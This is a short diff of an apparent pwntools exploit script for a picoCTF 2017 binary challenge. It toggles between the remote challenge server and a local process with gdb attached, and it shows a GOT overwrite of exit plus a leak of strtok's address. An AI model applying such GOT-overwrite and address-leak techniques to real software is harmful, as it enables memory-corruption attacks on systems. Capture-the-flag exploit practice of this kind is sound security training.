@@ -14,8 +14,8 @@ GOT_EXIT = 0x601258
 GOT_STRTOK = 0x601250
 GOT_STRLEN = 0x601210
 
-# p = process(executable=prog[0], argv=prog, env={'LD_PRELOAD': './libc.so.6.remote'})
-p = remote('shell2017.picoctf.com', 46394)
+p = process(executable=prog[0], argv=prog, env={'LD_PRELOAD': './libc.so.6.remote'})
+# p = remote('shell2017.picoctf.com', 46394)
 
 def write(val, addr):
     # write 4 bytes in 2 parts
@@ -47,7 +47,7 @@ watch (long *)*0x601210
 b *0x4009a8
 c
 """
-#gdb.attach(p, GDB)
+gdb.attach(p, GDB)
 write(LOOP, GOT_EXIT)
 strtok_addr = read(GOT_STRTOK)
 
